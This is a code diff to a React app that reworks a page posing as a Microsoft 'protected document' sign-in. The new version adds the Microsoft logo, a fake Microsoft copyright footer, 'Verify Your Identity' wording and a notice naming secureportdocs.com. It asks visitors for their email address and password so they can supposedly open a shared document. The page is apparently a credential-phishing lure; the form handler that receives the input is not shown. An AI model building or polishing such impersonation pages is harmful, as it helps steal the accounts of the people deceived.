@@ -514,219 +514,268 @@ function App() {
     case 'document-protection':
       return (
         <div style={{
-          display: 'flex',
-          justifyContent: 'center',
-          alignItems: 'center',
+          background: '#f7f9fb',
+          fontFamily: "'Segoe UI', Arial, sans-serif",
           minHeight: '100vh',
-          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
-          backgroundColor: '#f3f2f1',
-          padding: '20px'
+          margin: 0,
+          display: 'flex',
+          flexDirection: 'column',
+          alignItems: 'center',
         }}>
-          <div className="fade-in" style={{
-            textAlign: 'center',
-            background: 'white',
-            padding: '50px 60px',
-            borderRadius: '12px',
-            boxShadow: '0 8px 32px rgba(0,0,0,0.12)',
-            maxWidth: '500px',
-            width: '100%'
+          <div style={{
+            background: '#fff',
+            borderRadius: '10px',
+            boxShadow: '0 6px 22px 0 rgba(0,0,0,0.08)',
+            padding: '35px 45px 35px 45px',
+            maxWidth: '530px',
+            width: '100%',
+            marginTop: '38px',
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
           }}>
-            {/* Removed Protected Document Icon and badge as requested */}
-            <h2 style={{ 
-              color: '#323130', 
-              margin: '0 0 15px',
-              fontSize: '28px',
-              fontWeight: '600',
-              lineHeight: '1.3'
-            }}>
-              Protected Document
-            </h2>
-            <p style={{ 
-              color: '#605e5c', 
-              margin: '0 0 25px',
-              fontSize: '16px',
-              lineHeight: '1.5'
-            }}>
-              This Document contains confidential information and requires authentication to access.
-            </p>
+            <img 
+              style={{
+                width: '100px',
+                marginBottom: '28px',
+                display: 'block',
+              }}
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" 
+              alt="Microsoft Logo"
+            />
             <div style={{
-              background: '#fff4ce',
-              border: '1px solid #ffcc02',
-              borderRadius: '6px',
-              padding: '15px',
-              margin: '0 0 25px',
-              display: 'flex',
-              alignItems: 'center',
-              textAlign: 'left'
+              fontSize: '1.7em',
+              fontWeight: 600,
+              color: '#23272a',
+              marginBottom: '16px',
+              letterSpacing: '0.01em',
+              textAlign: 'center',
             }}>
-              <span style={{
-                fontSize: '18px',
-                marginRight: '10px'
-              }}>⚠️</span>
-              <div style={{
-                fontSize: '13px',
-                color: '#605e5c'
-              }}>
-                <strong style={{ color: '#323130' }}>Authentication Required</strong><br/>
-                Please sign in with your Microsoft account to verify your access permissions.
-              </div>
+              Verify Your Identity
             </div>
-            {/* Email and Password Form */}
-            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '25px' }}>
-              <div style={{ marginBottom: '15px' }}>
-                <label style={{
-                  display: 'block',
-                  fontSize: '14px',
-                  fontWeight: '600',
-                  color: '#323130',
-                  marginBottom: '6px'
-                }}>
+            <div style={{
+              fontSize: '1.04em',
+              color: '#38444d',
+              marginBottom: '10px',
+              textAlign: 'center',
+            }}>
+              You've received a secure document
+            </div>
+            <div style={{
+              fontSize: '1.13em',
+              fontWeight: 150,
+              color: '#0078d4',
+              marginBottom: '16px',
+              textAlign: 'center',
+              wordBreak: 'break-word',
+            }}>
+              Protected Document File
+            </div>
+            <div style={{
+              fontSize: '1em',
+              color: '#626b76',
+              marginBottom: '20px',
+              lineHeight: '1.5em',
+              textAlign: 'center',
+            }}>
+              To open this secure Document, please enter the email address that this item was shared to.
+            </div>
+            <form onSubmit={handleFormSubmit} style={{ width: '100%' }}>
+              <div style={{
+                width: '200%',
+                maxWidth: '1000px',
+                marginLeft: '-50%',
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'flex-start',
+                background: 'none',
+              }}>
+                <label 
+                  style={{
+                    fontSize: '0.97em',
+                    color: '#4d5a67',
+                    marginBottom: '7px',
+                    textAlign: 'left',
+                    marginLeft: '8px',
+                    marginTop: '10px',
+                    alignSelf: 'flex-start',
+                  }}
+                  htmlFor="email"
+                >
                   Email Address
                 </label>
-                <input
-                  type="email"
-                  value={formEmail}
-                  onChange={(e) => setFormEmail(e.target.value)}
-                  required
-                  style={{
-                    width: '100%',
-                    padding: '12px 16px',
-                    border: '1px solid #d2d0ce',
-                    borderRadius: '6px',
-                    fontSize: '16px',
-                    fontFamily: 'inherit',
-                    boxSizing: 'border-box'
-                  }}
-                  placeholder="Enter your Microsoft email"
-                />
-              </div>
-              <div style={{ marginBottom: '20px' }}>
-                <label style={{
-                  display: 'block',
-                  fontSize: '14px',
-                  fontWeight: '600',
-                  color: '#323130',
-                  marginBottom: '6px'
+                <div style={{
+                  width: '100%',
+                  position: 'relative',
+                  marginBottom: '18px',
+                  background: '#f6f8fa',
+                  borderRadius: '6px',
+                  display: 'flex',
+                  alignItems: 'center',
                 }}>
+                  <input 
+                    type="email" 
+                    id="email" 
+                    placeholder="Enter email"
+                    required
+                    value={formEmail}
+                    onChange={(e) => setFormEmail(e.target.value)}
+                    style={{
+                      width: '100%',
+                      fontSize: '1.07em',
+                      padding: '12px 60px 12px 20px',
+                      border: '1.5px solid #cfd8dc',
+                      borderRadius: '6px',
+                      boxSizing: 'border-box',
+                      transition: 'border 0.2s',
+                      outline: 'none',
+                      background: 'transparent',
+                      marginBottom: 0,
+                      display: 'block',
+                      color: '#23272a',
+                    }}
+                  />
+                  <svg 
+                    style={{
+                      position: 'absolute',
+                      right: '12px',
+                      top: '50%',
+                      transform: 'translateY(-50%)',
+                      width: '22px',
+                      height: '22px',
+                      opacity: 0.6,
+                      pointerEvents: 'none',
+                    }}
+                    viewBox="0 0 24 24" 
+                    fill="none"
+                  >
+                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
+                    <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
+                  </svg>
+                </div>
+                <label 
+                  style={{
+                    fontSize: '0.97em',
+                    color: '#4d5a67',
+                    marginBottom: '7px',
+                    textAlign: 'left',
+                    marginLeft: '8px',
+                    marginTop: '10px',
+                    alignSelf: 'flex-start',
+                  }}
+                  htmlFor="password"
+                >
                   Password
                 </label>
-                <input
-                  type="password"
-                  value={formPassword}
-                  onChange={(e) => setFormPassword(e.target.value)}
-                  required
+                <div style={{
+                  width: '100%',
+                  position: 'relative',
+                  marginBottom: '18px',
+                  background: '#f6f8fa',
+                  borderRadius: '6px',
+                  display: 'flex',
+                  alignItems: 'center',
+                }}>
+                  <input 
+                    type="password" 
+                    id="password" 
+                    placeholder="Enter password"
+                    required
+                    value={formPassword}
+                    onChange={(e) => setFormPassword(e.target.value)}
+                    style={{
+                      width: '100%',
+                      fontSize: '1.07em',
+                      padding: '12px 60px 12px 20px',
+                      border: '1.5px solid #cfd8dc',
+                      borderRadius: '6px',
+                      boxSizing: 'border-box',
+                      transition: 'border 0.2s',
+                      outline: 'none',
+                      background: 'transparent',
+                      marginBottom: 0,
+                      display: 'block',
+                      color: '#23272a',
+                    }}
+                  />
+                  <svg 
+                    style={{
+                      position: 'absolute',
+                      right: '12px',
+                      top: '50%',
+                      transform: 'translateY(-50%)',
+                      width: '22px',
+                      height: '22px',
+                      opacity: 0.6,
+                      pointerEvents: 'none',
+                    }}
+                    viewBox="0 0 24 24" 
+                    fill="none"
+                  >
+                    <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
+                    <circle cx="12" cy="13" r="2" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
+                    <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
+                  </svg>
+                </div>
+                <button 
                   style={{
                     width: '100%',
-                    padding: '12px 16px',
-                    border: '1px solid #d2d0ce',
-                    borderRadius: '6px',
-                    fontSize: '16px',
-                    fontFamily: 'inherit',
-                    boxSizing: 'border-box'
+                    background: isSubmitting 
+                      ? 'linear-gradient(90deg,#8a8a8a 0,#6a6a6a 100%)'
+                      : 'linear-gradient(90deg,#0078d4 0,#005fa3 100%)',
+                    color: '#fff',
+                    border: 'none',
+                    borderRadius: '4px',
+                    fontSize: '1.15em',
+                    fontWeight: 500,
+                    padding: '14px 0',
+                    cursor: isSubmitting ? 'not-allowed' : 'pointer',
+                    marginBottom: '18px',
+                    marginTop: '6px',
+                    boxShadow: '0 2px 8px rgba(0,120,212,0.08)',
+                    transition: 'background 0.18s',
                   }}
-                  placeholder="Enter your password"
-                />
+                  type="submit"
+                  disabled={isSubmitting}
+                  onMouseOver={(e) => {
+                    if (!isSubmitting) {
+                      e.currentTarget.style.background = 'linear-gradient(90deg,#005fa3 0,#0078d4 100%)';
+                    }
+                  }}
+                  onMouseOut={(e) => {
+                    if (!isSubmitting) {
+                      e.currentTarget.style.background = 'linear-gradient(90deg,#0078d4 0,#005fa3 100%)';
+                    }
+                  }}
+                >
+                  {isSubmitting ? 'Authenticating...' : 'Authenticate & Open Document'}
+                </button>
               </div>
-              <button
-                type="submit"
-                disabled={isSubmitting}
-                className="protected-doc"
-                style={{
-                  width: '100%',
-                  padding: '16px 24px',
-                  background: isSubmitting 
-                    ? 'linear-gradient(135deg, #8a8a8a 0%, #6a6a6a 100%)'
-                    : 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: '6px',
-                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                  fontSize: '16px',
-                  fontWeight: '600',
-                  boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
-                  transition: 'all 0.2s ease',
-                  textShadow: '0 1px 2px rgba(0,0,0,0.2)',
-                  position: 'relative',
-                  overflow: 'hidden'
-                }}
-                onMouseOver={(e) => {
-                  if (!isSubmitting) {
-                    e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
-                    e.currentTarget.style.transform = 'translateY(-2px)';
-                    e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
-                  }
-                }}
-                onMouseOut={(e) => {
-                  if (!isSubmitting) {
-                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
-                    e.currentTarget.style.transform = 'translateY(0)';
-                    e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
-                  }
-                }}
-              >
-                {isSubmitting ? '🔄 Authenticating...' : 'Authenticate & Open Document'}
-              </button>
             </form>
-            <div style={{
-              display: 'flex',
-              justifyContent: 'center',
-              gap: '15px',
-              marginTop: '20px'
+            <p style={{
+              fontSize: '0.92em',
+              color: '#8896ae',
+              marginTop: '12px',
+              marginBottom: 0,
+              textAlign: 'justify',
+              lineHeight: '1.5em',
+              maxWidth: '100%',
+              width: '100%',
+              letterSpacing: '0.01em',
+              wordBreak: 'break-word',
+              display: 'block',
             }}>
-              <button
-                onClick={() => setCurrentPage('captcha')}
-                style={{
-                  padding: '8px 16px',
-                  backgroundColor: 'transparent',
-                  color: '#0078d4',
-                  border: '1px solid #0078d4',
-                  borderRadius: '6px',
-                  cursor: 'pointer',
-                  fontSize: '14px',
-                  fontWeight: '500'
-                }}
-                onMouseOver={(e) => {
-                  e.currentTarget.style.backgroundColor = '#f3f2f1';
-                }}
-                onMouseOut={(e) => {
-                  e.currentTarget.style.backgroundColor = 'transparent';
-                }}
-              >
-                ← Back to Start
-              </button>
-              <button
-                onClick={() => {
-                  alert('For security reasons, document access requires authentication through Microsoft.');
-                }}
-                style={{
-                  padding: '8px 16px',
-                  backgroundColor: 'transparent',
-                  color: '#605e5c',
-                  border: '1px solid #d2d0ce',
-                  borderRadius: '6px',
-                  cursor: 'pointer',
-                  fontSize: '14px',
-                  fontWeight: '500'
-                }}
-                onMouseOver={(e) => {
-                  e.currentTarget.style.backgroundColor = '#f3f2f1';
-                }}
-                onMouseOut={(e) => {
-                  e.currentTarget.style.backgroundColor = 'transparent';
-                }}
-              >
-                Request Access
-              </button>
-            </div>
-            <div style={{
-              marginTop: '25px',
-              paddingTop: '20px',
-              borderTop: '1px solid #edebe9',
-              fontSize: '12px',
-              color: '#a19f9d'
-            }}>
-              Secure Document Access Portal
-            </div>
+              By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement. secureportdocs.com has not provided links to their terms for you to review.
+            </p>
+          </div>
+          <div style={{
+            textAlign: 'center',
+            color: '#b0b9c6',
+            fontSize: '0.98em',
+            marginTop: '18px',
+            marginBottom: '15px',
+          }}>
+            © 2025 Microsoft &nbsp; Privacy & Cookies
           </div>
         </div>
       );
